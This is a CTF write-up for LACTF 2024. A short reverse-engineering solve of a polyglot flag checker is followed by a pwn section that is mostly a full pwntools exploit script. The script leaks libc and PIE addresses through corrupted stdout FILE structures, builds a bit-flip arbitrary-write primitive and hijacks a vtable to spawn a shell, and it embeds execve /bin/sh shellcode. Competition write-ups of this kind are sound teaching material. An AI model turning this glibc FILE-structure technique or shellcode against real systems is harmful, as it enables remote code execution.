# LACTF 2024 Writeups

## glottem

### Discription

Category: Rev

Points: 455

Solves: 89

### Solve

This challenge provided a shell script,embeded with js and python scripts.

```bash
#!/bin/sh
1<<4201337
1//1,"""
exit=process.exit;argv=process.argv.slice(1)/*
4201337
read -p "flag? " flag
node $0 "$flag" && python3 $0 "$flag" && echo correct || echo incorrect
1<<4201337
*///""";from sys import argv
e = [...]
alpha="abcdefghijklmnopqrstuvwxyz_"
d=0;s=argv[1];1//1;"""
/*"""
#*/for (let i = 0; i < s.length; i ++) {/*
for i in range(6,len(s)-2):
    #*/d=(d*31+s.charCodeAt(i))%93097/*
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]#*/}
exit(+(d!=260,[d!=61343])[0])
4201337
```

This script asks for a flag, then checks if the flag is correct. It runs itself with the flag as an argument against both node and python.

Here is the simplified python script:

```python
d = 0
for i in range(6,len(s)-2):
    d+=e[i-6][alpha.index(s[i])][alpha.index(s[i+1])]
assert(d == 260)
```

and js script:

```javascript
d = 0
for (let i = 0; i < s.length; i ++) {
    d=(d*31+s.charCodeAt(i))%93097
}
assert(d == 61343)
```

It may appear unsolvable at first glance, but upon examining the array `e`, we would notice that all its elements lie within the range of 10 to 17. Furthermore, the sum of all 26 elements amounts to 260. Consequently, the elements we select must necessarily be multiples of 10.

For deeper analysis, we observe that the x-coordinate of the current element corresponds to the y-coordinate of the preceding element. This insight enables us to identify all possible paths consisting of 10s with a length of 26. Subsequently, we can validate each of these paths using JavaScript's logic checking mechanism. Below is the solving script for this approach.

```python
e = [...]
res=[]
idx=0
for i in e:
    cnt=0
    tmp=[]
    for ii,j in enumerate(i):
        t_tmp=[]
        for iii,jj in enumerate(j):
            if jj==10:
                t_tmp.append(iii)
                cnt+=1
        tmp.append(t_tmp)
    res.append(tmp)
    idx+=1

alpha="abcdefghijklmnopqrstuvwxyz_"

paths=[]
path=[]
last_j=-1
stack=[]
cur_path=[]

for jj in range(len(res[0])):
    j_map=res[0][jj]
    if len(j_map)==0:
        continue
    for j in j_map:
        stack.append(cur_path+[jj,j])

while stack:
    cur_path=stack.pop()
    if len(cur_path)==27:
        paths.append(cur_path)
        continue
    i_map=res[len(cur_path)-1]
    j_map=i_map[cur_path[-1]]
    if len(j_map)==0:
        continue
    for j in j_map:
        stack.append(cur_path+[j])

print(len(paths))

flags=[]
for i in paths:
    flags.append("".join(alpha[ii] for ii in i))

for flag in flags:
    tmp="lactf{"+flag+"}"
    d=0
    for i in range(len(tmp)):
        d=(d*31+ord(tmp[i]))%93097
    if d==61343:
        print(tmp)
```

## flipma

### Discription

Category: PWN

Points: 492

Solves: 19

### Analysis

This is a simple 64-bit binary with all protection on.
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The logic behind this program is straightforward: continue flipping the bit until the number of flips is no longer positive. The initial value of flips is set to 4, allowing us four opportunities to flip a bit.

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  while ( flips > 0 )
    flip();
  puts("no more flips");
  return 0;
}
```

The base addr of our flip is stdin which is on `libc` and the offset can be negative since `v1` is signed. Also, if input is invalid, it will just output and return.

```cpp
int flip()
{
  __int64 v1; // [rsp+10h] [rbp-10h]
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  write(1, "a: ", 3uLL);
  v1 = readint();
  write(1, "b: ", 3uLL);
  v2 = readint();
  if ( v2 >= 8 )
    return puts("we're flipping bits, not burgers");
  *((_BYTE *)&stdin->_flags + v1) ^= 1 << v2;
  return --flips;
}
```

With only four flips available, our options are severely limited. However, without access to the program's codebase, we must devise a strategy to manipulate the flips value. Fortunately, we can exploit the program's stdout to leak information about the codebase and the libc base. By altering `_flags` and `write_base` within `_IO_2_1_stdout_`, we can trigger a write operation between `write_base` and `write_ptr`.

Once the setup is complete, sending an invalid input can provoke the puts function, allowing us to leak the codebase and libc base. With this information, we can manipulate the flips value, granting us infinite flip chances and establishing an arbitrary address write primitive.

Utilizing this primitive, we can achieve Remote Code Execution (RCE) through various methods. In this exploit, I choose `house of apple`. Below is the full exploit script.

```python
# %%
from pwn import *

e = ELF("./flipma_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = e
context.os = "linux"
context.arch = context.binary.arch
context.terminal = ["alacritty", "-e"]

local = False
if local:
    # context.log_level = "debug"
    p = process([e.path])
else:
    # p = remote("chall.lac.tf", 31165)
    p = remote("localhost",5000)


def dbgaddr(addr, PIE=False):  # PIE enabled
    if local:
        if PIE:
            text_base = int(
                os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16
            )
            log.info(f"b *{hex(text_base + addr)}\n")
            gdb.attach(p, f"b *{hex(text_base + addr)}")
        else:
            gdb.attach(p, f"b *{hex(addr)}")


def dbg(func=""):
    if local:
        gdb.attach(p, func)


def main_arena():
    # from ptrlib
    ofs_stdin = libc.sym._IO_2_1_stdin_
    ofs_realloc_hook = libc.sym.__realloc_hook
    ofs_malloc_hook = libc.sym.__malloc_hook
    if ofs_realloc_hook is None or ofs_malloc_hook is None or ofs_stdin is None:
        return None

    if 0 < ofs_malloc_hook - ofs_stdin < 0x1000:
        # libc-2.33 or older
        if context.bits == 32:
            return ofs_malloc_hook + 0x18
        else:
            return ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook) * 2

    else:
        # libc-2.34 removed hooks
        ofs_tzname = libc.sym.tzname
        if ofs_tzname is None:
            return None
        if context.bits == 32:
            return ofs_tzname - 0x460
        else:
            return ofs_tzname - 0x8A0


def ROL(content, key):
    # house of emma
    # ROL(gadget_addr ^ fake_pointer_guard, 0x11)
    tmp = bin(content)[2:].rjust(64, "0")
    return int(tmp[key:] + tmp[:key], 2)


# dbgaddr(0x12AC, PIE=True)
# dbg("b _IO_wfile_overflow")

s = lambda str: p.send(str)
sl = lambda str: p.sendline(str)
sa = lambda delims, str: p.sendafter(delims, str)
sla = lambda delims, str: p.sendlineafter(delims, str)
r = lambda numb=4096: p.recv(numb)
rl = lambda: p.recvline()
ru = lambda delims, drop=True: p.recvuntil(delims, drop)
uu32 = lambda data: u32(data.ljust(4, b"\x00"))
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
li = lambda str, data: log.success(str + "========>" + hex(data))

# https://www.exploit-db.com/shellcodes
execve_bin_sh = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
execveat_bin_sh = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
cat_flag = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x67\x6d\x60\x66\x01\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
ls_current_dir = b"\x68\x2f\x2e\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\x89\xe7\x31\xd2\xbe\x01\x01\x02\x01\x81\xf6\x01\x01\x03\x01\x6a\x02\x58\x0f\x05\x48\x89\xc7\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x4e\x58\x0f\x05\x6a\x01\x5f\x31\xd2\xb6\x03\x48\x89\xe6\x6a\x01\x58\x0f\x05"

# %%
sla("a: ", str(0xD21))
sla("b: ", str(3))

sla("a: ", str(0xD21))
sla("b: ", str(4))

sla("a: ", str(0xD41))
sla("b: ", str(5))


sla("a: ", str(0xD41))
sla("b: ", str(-1))

s = r()
# print(s)
# %%
codebase = uu64(s[0x825 : 0x825 + 8]) - 0x4020
li("codebase", codebase)

libcbase = uu64(s[5 : 5 + 8]) - 0x157F10
li("libc base", libcbase)

stdin_addr = libcbase + 0x1EC980
li("stdin", stdin_addr)

flips = codebase + 0x4010
li("flips", flips)

offset = flips - stdin_addr
print("offset", hex(offset))

# %%
sla("a: ", str(offset))
sla("b: ", str(7))


# %%
def binary_diff_bits(a, b):
    res = []
    bin_a = bin(a)[2:][::-1]
    bin_b = bin(b)[2:][::-1]

    max_len = max(len(bin_a), len(bin_b))
    bin_a = bin_a.zfill(max_len)
    bin_b = bin_b.zfill(max_len)

    for i in range(max_len):
        if bin_a[i] != bin_b[i]:
            res.append(i)
    return res

# %%
new_vtable = libcbase + 0x1ED800
li("new vtable", new_vtable)

stdout = libcbase + libc.sym._IO_2_1_stdout_
ori_vtable = libcbase + 0x1E94A0
wfile_jumps = libcbase + 0x1E8F60
li("wfile", wfile_jumps)


# %%
def arb_write(addr, val, ori):
    res = binary_diff_bits(val, ori)
    print(res)

    base_offset = addr - stdin_addr
    for i in res:
        sla("a: ", str(base_offset + i // 8))
        sla("b: ", str(i % 8))


# %%
li("flags",uu64(b"  sh;"))
arb_write(stdout + 0xA0, new_vtable, libcbase + 0x1EC880)
arb_write(new_vtable + 0xE0, new_vtable + 0x100, 0)
arb_write(new_vtable + 0x168, libcbase+libc.sym.system, 0)
arb_write(stdout + 0xD8, wfile_jumps, ori_vtable)
arb_write(stdout,0x3b93de18a7,0)

# %%

sla("a: ", str(0xD41))
sla("b: ", str(-1))
# %%
p.interactive()
```